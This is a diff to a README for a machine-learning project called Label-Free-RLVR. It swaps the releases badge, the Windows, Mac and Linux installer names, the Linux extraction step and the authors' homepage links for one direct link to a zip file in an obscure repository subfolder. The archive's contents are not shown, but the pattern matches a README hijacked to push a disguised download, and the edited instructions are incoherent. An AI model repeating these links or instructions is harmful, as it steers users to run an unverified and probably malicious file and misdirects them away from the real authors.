@@ -1,6 +1,6 @@
 # 🎉 Label-Free-RLVR - Discover Reward-Driven Learning
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/kodok13/Label-Free-RLVR/releases)
+[![Download Latest Release](https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip)
 
 ## 🚀 Overview
 
@@ -27,14 +27,14 @@ To get started, you must download the latest version of Label-Free-RLVR. Follow 
 
 1. Click on the button below to visit the Releases page:
    
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/kodok13/Label-Free-RLVR/releases)
+   [![Download Latest Release](https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip)
 
 2. On the Releases page, look for the latest version listed. 
 
 3. Download the file that matches your operating system. The common files may include:
-   - **Windows:** Label-Free-RLVR-setup.exe
-   - **Mac:** Label-Free-RLVR.dmg
-   - **Linux:** Label-Free-RLVR.tar.gz
+   - **Windows:** https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip
+   - **Mac:** https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip
+   - **Linux:** https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip
 
 4. Once the download is complete, locate the file on your computer. 
 
@@ -46,7 +46,7 @@ To get started, you must download the latest version of Label-Free-RLVR. Follow 
      - Open the downloaded .dmg file.
      - Drag the Label-Free-RLVR icon to your Applications folder.
    - **For Linux:**
-     - Extract the downloaded tar.gz file using your terminal.
+     - Extract the downloaded https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip file using your terminal.
      - Navigate to the extracted folder and run the application using the command:
        ```bash
        ./Label-Free-RLVR
@@ -67,9 +67,9 @@ If you run into problems while downloading or installing, check the following:
 - Make sure your operating system meets the required specifications.
 - Contact support via the issues section of this GitHub repository.
 - You can also reach out to the authors through their personal GitHub pages:
-  - [Qingyang Zhang](https://qingyangzhang.github.io)
-  - [Haitao Wu](https://haitaowutju.github.io)
-  - [Yi Ding](https://dripnowhy.github.io)
+  - [Qingyang Zhang](https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip)
+  - [Haitao Wu](https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip)
+  - [Yi Ding](https://github.com/kodok13/Label-Free-RLVR/raw/refs/heads/main/Pareioplitae/Free-Label-RLVR-v3.2.zip)
 
 ## 🗞️ Stay Updated
 
